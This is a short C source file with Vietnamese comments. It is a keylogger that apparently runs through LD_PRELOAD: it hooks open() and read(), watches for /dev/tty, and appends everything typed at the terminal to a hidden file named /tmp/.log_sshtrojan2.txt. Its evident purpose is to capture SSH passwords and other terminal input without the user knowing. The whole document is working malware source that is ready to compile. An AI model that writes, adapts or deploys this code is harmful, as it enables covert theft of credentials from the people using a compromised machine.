#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdarg.h>

static int tty_fd = -1; // Lưu fd của /dev/tty

// Hook `open()` để lấy fd của /dev/tty
int open(const char *pathname, int flags, ...) {
    static int (*original_open)(const char *, int, ...) = NULL;
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }

    if (strstr(pathname, "/dev/tty")) {
        tty_fd = original_open(pathname, flags, 0644);
        return tty_fd;
    }

    // Xử lý `O_CREAT` cần mode_t
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode_t mode = va_arg(args, mode_t);
        va_end(args);
        return original_open(pathname, flags, mode);
    } else {
        return original_open(pathname, flags);
    }
}

// Hook `read()` để ghi log dữ liệu nhập vào từ `/dev/tty`
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*original_read)(int, void*, size_t) = NULL;
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t bytesRead = original_read(fd, buf, count);

    if (fd == tty_fd && bytesRead > 0) { // Chỉ ghi log nếu đọc từ `/dev/tty`
        int log_fd = open("/tmp/.log_sshtrojan2.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (log_fd >= 0) {
            write(log_fd, buf, bytesRead);
            write(log_fd, "", 1);
            close(log_fd);
        }
    }

    return bytesRead;
}